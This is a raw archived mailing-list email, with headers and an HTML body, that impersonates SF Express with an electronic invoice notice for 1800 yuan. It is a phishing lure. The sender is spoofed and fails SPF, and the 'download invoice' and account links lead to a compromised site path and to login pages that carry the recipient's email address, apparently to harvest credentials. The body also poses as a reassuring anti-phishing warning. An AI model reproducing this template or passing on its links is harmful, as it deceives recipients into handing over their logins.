Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 3D45C6AD690
	for <lists+industrypack-devel@lfdr.de>; Tue,  7 Mar 2023 05:51:08 +0100 (CET)
Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1pZPI2-0006bE-Hp
	for lists+industrypack-devel@lfdr.de;
	Tue, 07 Mar 2023 04:51:05 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-1.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <jenny.lee@nipponexpress.com>) id 1pZPI0-0006b3-Hn
 for industrypack-devel@lists.sourceforge.net;
 Tue, 07 Mar 2023 04:51:03 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Type:MIME-Version:Message-ID:Date:Subject:
 To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=bLr0G6FX6yxO4/0gVwHNESisgTszvW5aAO65afXaLkg=; b=c36ZCJG5fM42XR8qWWqf6mp+q+
 MKjpYQ+IDujw6b0xNi47caexK3xNvd01sjLYkR2Wm/nm+S4bqL0yqXq1WvmZPh44tbQe3uHjL0IU9
 t53xrtDmIk8yK8ZZIWfv9p4Y7Be6e02Ok74Yu/tSRq/hefcvjK5Br1rhfxezQZydwb/w=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Type:MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=bLr0G6FX6yxO4/0gVwHNESisgTszvW5aAO65afXaLkg=; b=O
 PtgYu5QxfN2uP9C8UIwC9CCTfKw6PLoKDyNCV0GYSg5ZATBQtLu9LH2wPsPRaMB3xMdoTcXvExZn1
 5hTnCBkvgQnCH+AcFdpE2KJqCYJ6/fTODJ0ELWuHSPJoiqX537PmfiYLNM5pIVcLLtzo1ySE+R9vB
 4jo37CYErz8j5rZQ=;
Received: from [104.223.21.94] (helo=mail0.mdpi.com)
 by sfi-mx-1.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1pZPHw-001jLy-6F for industrypack-devel@lists.sourceforge.net;
 Tue, 07 Mar 2023 04:51:03 +0000
From: S-F Express <jenny.lee@nipponexpress.com>
To: industrypack-devel@lists.sourceforge.net
Date: 07 Mar 2023 04:30:38 +0000
Message-ID: <20230307043038.4F01DA63D5718C05@nipponexpress.com>
MIME-Version: 1.0
X-Spam-Score: 2.3 (++)
X-Spam-Report: Spam detection software, running on the system "util-spamd-1.v13.lw.sourceforge.com",
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 
 Content preview:  运单号 : ***6679090**** industrypack-devel@lists.sourceforge.net，
    感谢您选择顺丰速运为您提供的收派服务。 
 
 Content analysis details:   (2.3 points, 6.0 required)
 
  pts rule name              description
 ---- ---------------------- --------------------------------------------------
  0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
  1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
  0.0 HTML_FONT_FACE_BAD     BODY: HTML font face is not a word
  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
  0.0 HTML_MESSAGE           BODY: HTML included in message
  1.3 RDNS_NONE              Delivered to internal network by a host with no rDNS
X-Headers-End: 1pZPHw-001jLy-6F
Subject: [Industrypack-devel] =?utf-8?b?6aG65Liw55S15a2Q5Y+R56Wo5Ye656Wo?=
 =?utf-8?b?6YCa55+lOiBbKioqNjY4OTkwKioqKl0=?=
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============5008227615094646546=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net


--===============5008227615094646546==
Content-Type: multipart/related;
	boundary="----=_NextPart_000_0012_CC396F6B.54A02853"


------=_NextPart_000_0012_CC396F6B.54A02853
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
<body>
<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: small; FONT-FAMILY: Arial,=
 Helvetica, sans-serif; BORDER-RIGHT-WIDTH: 0px; WHITE-SPACE: normal; BORDE=
R-BOTTOM-WIDTH: 0px; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: =
400; COLOR: rgb(34,34,34); OUTLINE-WIDTH: 0px; PADDING-BOTTOM: 5px; FONT-ST=
YLE: normal; PADDING-TOP: 10px; OUTLINE-STYLE: none; PADDING-LEFT: 20px; OR=
PHANS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIGHT: 20=
px; BORDER-TOP-WIDTH: 0px; TEXT-INDENT: 0px;=20
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
initial; text-decoration-color: initial">
<img style=3D"FONT-SIZE: 12px; BORDER-TOP: 0px; FONT-FAMILY: &quot;Microsof=
t Yahei&quot;, verdana; BORDER-RIGHT: 0px; BORDER-BOTTOM: 0px; FLOAT: left;=
 COLOR: rgb(255,255,255); OUTLINE-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-=
TOP: 0px; OUTLINE-STYLE: none; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN:=
 0px; OUTLINE-COLOR: invert; PADDING-RIGHT: 0px; MAX-HEIGHT: 36px" alt=3D"?=
?" src=3D"cid:expresslogo2.gif" width=3D"126" height=3D"43"></DIV>
<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: small; FONT-FAMILY: Arial,=
 Helvetica, sans-serif; BORDER-RIGHT-WIDTH: 0px; WHITE-SPACE: normal; BORDE=
R-BOTTOM-WIDTH: 0px; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: =
400; COLOR: rgb(34,34,34); OUTLINE-WIDTH: 0px; PADDING-BOTTOM: 5px; FONT-ST=
YLE: normal; PADDING-TOP: 10px; OUTLINE-STYLE: none; PADDING-LEFT: 20px; OR=
PHANS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIGHT: 20=
px; BORDER-TOP-WIDTH: 0px; TEXT-INDENT: 0px;=20
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
initial; text-decoration-color: initial"><SPAN style=3D"BORDER-TOP: 0px; HE=
IGHT: 69px; BORDER-RIGHT: 0px; BORDER-BOTTOM: 0px; FLOAT: left; OUTLINE-WID=
TH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; OUTLINE-STYLE: none; PADDIN=
G-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; DISPLAY: block; OUTLINE-COLOR: =
invert; LINE-HEIGHT: 69px; PADDING-RIGHT: 0px">
<FONT color=3D#aeaeae face=3D"Microsoft Yahei, verdana"><SPAN style=3D"FONT=
-SIZE: 16px; BORDER-TOP: 0px; BORDER-RIGHT: 0px; BORDER-BOTTOM: 0px; OUTLIN=
E-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; OUTLINE-STYLE: none; P=
ADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; OUTLINE-COLOR: invert; PAD=
DING-RIGHT: 0px">&#36816;&#21333;&#21495;</SPAN></FONT></SPAN>
 <SPAN style=3D"BORDER-TOP: 0px; HEIGHT: 69px; BORDER-RIGHT: 0px; BORDER-BO=
TTOM: 0px; FLOAT: left; OUTLINE-WIDTH: 0px; PADDING-BOTTOM: 0px; TEXT-ALIGN=
: left; PADDING-TOP: 0px; OUTLINE-STYLE: none; PADDING-LEFT: 0px; BORDER-LE=
FT: 0px; MARGIN: 0px; DISPLAY: block; OUTLINE-COLOR: invert; LINE-HEIGHT: 6=
9px; PADDING-RIGHT: 0px"><FONT color=3D#aeaeae face=3D"Microsoft Yahei, ver=
dana">
<SPAN style=3D"FONT-SIZE: 16px; BORDER-TOP: 0px; BORDER-RIGHT: 0px; BORDER-=
BOTTOM: 0px; OUTLINE-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; OUT=
LINE-STYLE: none; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; OUTLINE=
-COLOR: invert; PADDING-RIGHT: 0px">: ***6679090****</SPAN></FONT></SPAN><B=
R></DIV>
<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: small; FONT-FAMILY: Arial,=
 Helvetica, sans-serif; BORDER-RIGHT-WIDTH: 0px; WHITE-SPACE: normal; BORDE=
R-BOTTOM-WIDTH: 0px; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: =
400; COLOR: rgb(34,34,34); OUTLINE-WIDTH: 0px; PADDING-BOTTOM: 5px; FONT-ST=
YLE: normal; PADDING-TOP: 10px; OUTLINE-STYLE: none; PADDING-LEFT: 20px; OR=
PHANS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIGHT: 20=
px; BORDER-TOP-WIDTH: 0px; TEXT-INDENT: 0px;=20
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
initial; text-decoration-color: initial"><BR></DIV>
<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: small; FONT-FAMILY: Arial,=
 Helvetica, sans-serif; BORDER-RIGHT-WIDTH: 0px; WHITE-SPACE: normal; BORDE=
R-BOTTOM-WIDTH: 0px; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: =
400; COLOR: rgb(34,34,34); OUTLINE-WIDTH: 0px; PADDING-BOTTOM: 5px; FONT-ST=
YLE: normal; TEXT-ALIGN: left; PADDING-TOP: 10px; OUTLINE-STYLE: none; PADD=
ING-LEFT: 20px; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal;=
 PADDING-RIGHT: 20px; BORDER-TOP-WIDTH: 0px;=20
TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal=
; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-=
decoration-style: initial; text-decoration-color: initial"><FONT size=3D+0>=
industrypack-devel@lists.sourceforge.net&#65292;</FONT><BR></DIV>
<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: small; FONT-FAMILY: Arial,=
 Helvetica, sans-serif; BORDER-RIGHT-WIDTH: 0px; WHITE-SPACE: normal; BORDE=
R-BOTTOM-WIDTH: 0px; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: =
400; COLOR: rgb(34,34,34); OUTLINE-WIDTH: 0px; PADDING-BOTTOM: 5px; FONT-ST=
YLE: normal; TEXT-ALIGN: left; PADDING-TOP: 10px; OUTLINE-STYLE: none; PADD=
ING-LEFT: 20px; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal;=
 PADDING-RIGHT: 20px; BORDER-TOP-WIDTH: 0px;=20
TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal=
; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-=
decoration-style: initial; text-decoration-color: initial"><BR><FONT size=
=3D+0>&#24863;&#35874;&#24744;&#36873;&#25321;&#39034;&#20016;&#36895;&#368=
16;&#20026;&#24744;&#25552;&#20379;&#30340;&#25910;&#27966;&#26381;&#21153;=
&#12290;<BR><BR>
&#25105;&#20204;&#24050;&#25353;&#24744;&#30340;&#35201;&#27714;&#21521;&#2=
4744;&#21457;&#20986;&#30005;&#23376;&#21457;&#31080;&#12290; &#35831;&#214=
42;&#38405;&#19979;&#38754;&#21457;&#31080;&#30340;&#19968;&#20123;&#32454;=
&#33410;&#12290;<BR><BR>&#21457;&#31080;&#32534;&#21495;&#65306;***668990**=
**<BR><BR>&#21457;&#31080;&#37329;&#39069;&#65306;&#20803;1800.0<BR><BR>
&#24744;&#21487;&#20197;&#36890;&#36807;&#20197;&#19979;&#36873;&#39033;&#2=
6597;&#30475;&#25110;&#19979;&#36733;&#21457;&#31080;&#12290;<BR style=3D"F=
ONT-FAMILY: arial, verdana, sans-serif; COLOR: rgb(56,56,56); BACKGROUND-CO=
LOR: rgb(236,236,236)"><BR style=3D"FONT-FAMILY: arial, verdana, sans-serif=
; COLOR: rgb(56,56,56); BACKGROUND-COLOR: rgb(236,236,236)"><B>
<A style=3D"COLOR: rgb(17,85,204)" href=3D"https://wncinternalmedicine.com/=
=2Ewell-known/acme-challenge/fddf/?email=3Dindustrypack-devel@lists.sourcef=
orge.net" target=3D_blank data-saferedirecturl=3D"https://www.google.com/ur=
l?q=3Dhttps://clair-watson.com/6/SF-Express/?login%3D%5B%5B-Email-%5D%5D&am=
p;source=3Dgmail&amp;ust=3D1674953510113000&amp;usg=3DAOvVaw3q3ekplYhl-pKMF=
YtksJVI">&#19979;&#36733;PDF &#26684;&#24335;&#30005;&#23376;&#21457;&#3108=
0;</A></B>
 <BR style=3D"FONT-FAMILY: arial, verdana, sans-serif; COLOR: rgb(56,56,56)=
; BACKGROUND-COLOR: rgb(236,236,236)"><B><A style=3D"COLOR: rgb(17,85,204)"=
 href=3D"https://wncinternalmedicine.com/.well-known/acme-challenge/fddf/?e=
mail=3Dindustrypack-devel@lists.sourceforge.net" target=3D_blank data-safer=
edirecturl=3D"https://www.google.com/url?q=3Dhttps://clair-watson.com/6/SF-=
Express/?login%3D%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D167495351=
0113000&amp;usg=3DAOvVaw3q3ekplYhl-pKMFYtksJVI">
&#19979;&#36733;JPG &#26684;&#24335;&#30005;&#23376;&#21457;&#31080;</A></B=
></FONT> <BR style=3D"FONT-FAMILY: arial, verdana, sans-serif; COLOR: rgb(5=
6,56,56); BACKGROUND-COLOR: rgb(236,236,236)"><BR style=3D"FONT-FAMILY: ari=
al, verdana, sans-serif; COLOR: rgb(56,56,56); BACKGROUND-COLOR: rgb(236,23=
6,236)">
<table style=3D"HEIGHT: 270px; FONT-FAMILY: Helvetica, &quot;Microsoft Yahe=
i&quot;, verdana; WIDTH: 800px; BORDER-BOTTOM: rgb(84,84,84) 1px solid; COL=
OR: rgb(255,255,255); PADDING-TOP: 20px; BACKGROUND-COLOR: rgb(51,51,51)" c=
ellspacing=3D"0" cellpadding=3D"0">
<TBODY>
<TR style=3D"WIDTH: 70px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LE=
FT: 43px; MARGIN: 0px; PADDING-RIGHT: 0px">
<td style=3D"FONT-FAMILY: arial, verdana, sans-serif; WIDTH: 70px; PADDING-=
BOTTOM: 0px; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 43px; MARGIN=
: 0px; LINE-HEIGHT: 1.666; PADDING-RIGHT: 0px"><FONT face=3D&#24494;&#36719=
;&#38597;&#40657;>&#28201;&#39336;&#25552;&#31034;&#65306;</FONT></TD></TR>=

<TR style=3D"WIDTH: 70px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LE=
FT: 43px; MARGIN: 0px; PADDING-RIGHT: 0px">
<td style=3D"FONT-SIZE: 16px; FONT-FAMILY: arial, verdana, sans-serif; WIDT=
H: 70px; PADDING-BOTTOM: 0px; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-L=
EFT: 43px; MARGIN: 0px; LINE-HEIGHT: 24px; PADDING-RIGHT: 0px">
<DIV style=3D"HEIGHT: 8px; WIDTH: 8px; PADDING-BOTTOM: 0px; PADDING-TOP: 0p=
x; PADDING-LEFT: 0px; MARGIN: 0px 10px; DISPLAY: inline-block; PADDING-RIGH=
T: 0px; BACKGROUND-COLOR: rgb(84,84,84); border-radius: 50%"></DIV><FONT fa=
ce=3D&#24494;&#36719;&#38597;&#40657;>&#39034;&#20016;&#30005;&#23376;&#361=
34;&#21333;&#24050;&#20840;&#38754;&#21319;&#32423;&#65292;&#30340;&#24494;=
&#20449;&#20844;&#20247;&#21495;&#25110;&#35775;&#38382;<BR><BR>
<A style=3D"COLOR: rgb(6,73,119); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PA=
DDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px" href=3D"https://wncintern=
almedicine.com/.well-known/acme-challenge/fddf/?email=3Dindustrypack-devel@=
lists.sourceforge.net" rel=3D"noopener noreferrer" target=3D_blank data-saf=
eredirecturl=3D"https://www.google.com/url?q=3Dhttp://helionproducts.com/da=
mp/SF-Express/?login%3D%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D167=
4953510113000&amp;usg=3DAOvVaw3cGs64keOZWiokF_SIBjGJ"><FONT color=3D#ffffff=
><U>
htp://v.sf-express.com</U></FONT></A> &nbsp;&nbsp;. &#26597;&#30475;&#36134=
;&#21333;&#26126;&#32454;&#12289;</FONT></TD></TR>
<TR style=3D"WIDTH: 70px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LE=
FT: 43px; MARGIN: 0px; PADDING-RIGHT: 0px">
<td style=3D"FONT-FAMILY: arial, verdana, sans-serif; WIDTH: 70px; PADDING-=
BOTTOM: 0px; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 43px; MARGIN=
: 0px; LINE-HEIGHT: 24px; PADDING-RIGHT: 0px">
<DIV style=3D"FONT-SIZE: 16px; HEIGHT: 8px; PADDING-BOTTOM: 0px; PADDING-TO=
P: 0px; PADDING-LEFT: 0px; MARGIN: 0px 10px; DISPLAY: inline-block; PADDING=
-RIGHT: 0px; BACKGROUND-COLOR: rgb(84,84,84); border-radius: 50%"></DIV><FO=
NT face=3D&#24494;&#36719;&#38597;&#40657;>
&nbsp;&nbsp;&#39034;&#20016;&#36895;&#36816;&#26376;&#32467;&#26381;&#21153=
;&#20165;&#36890;&#36807;&#20197;&#19979;&#37038;&#31665;&#22320;&#22336;&#=
32473;&#24744;&#21457;&#36865;&#26376;&#32467;&#20986;&#36134;&#36890;&#306=
93;&#65292;<WBR>&#33509;&#38750;&#20197;&#19979;&#37038;&#31665;&#22320;&#2=
2336;&#65306;<BR>
<A style=3D"COLOR: rgb(17,85,204)" href=3D"https://wncinternalmedicine.com/=
=2Ewell-known/acme-challenge/fddf/?email=3Dindustrypack-devel@lists.sourcef=
orge.net" target=3D_blank data-saferedirecturl=3D"https://www.google.com/ur=
l?q=3Dhttp://helionproducts.com/damp/SF-Express/?login%3D%5B%5B-Email-%5D%5=
D&amp;source=3Dgmail&amp;ust=3D1674953510113000&amp;usg=3DAOvVaw3cGs64keOZW=
iokF_SIBjGJ">sfbill@sf-express.ebill.com</A>&#12290; &#35831;&#21247;&#3854=
3;&#24847;&#25171;&#24320;&#65292;&#35880;&#38450;&#38035;&#40060;&#37038;&=
#20214;&#12290;</FONT>
 </TD></TR>
<TR style=3D"COLOR: rgb(84,84,84); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; P=
ADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">
<td style=3D"FONT-SIZE: 16px; FONT-FAMILY: arial, verdana, sans-serif; COLO=
R: rgb(126,126,126); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0=
px; MARGIN: 0px; LINE-HEIGHT: 1.666; PADDING-RIGHT: 0px" valign=3D"middle" =
align=3D"center"><FONT face=3D&#24494;&#36719;&#38597;&#40657;>
&#27492;&#37038;&#20214;&#20026;&#31995;&#32479;&#33258;&#21160;&#21457;&#2=
0986;&#65292;&#35831;&#21247;&#30452;&#25509;&#22238;&#22797;&#65292; &#229=
14;&#26377;&#24322;&#24120;&#21487;&#19982;&#24744;&#19987;&#23646;&#23545;=
&#36134;&#20154;&#32852;&#31995;</FONT></TD></TR></TBODY></TABLE></DIV></BO=
DY></HTML>
------=_NextPart_000_0012_CC396F6B.54A02853
Content-Type: image/gif; name="expresslogo2.gif"
Content-Transfer-Encoding: base64
Content-ID: <expresslogo2.gif>

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
gNxuuyoBAQA7

------=_NextPart_000_0012_CC396F6B.54A02853--



--===============5008227615094646546==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============5008227615094646546==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============5008227615094646546==--


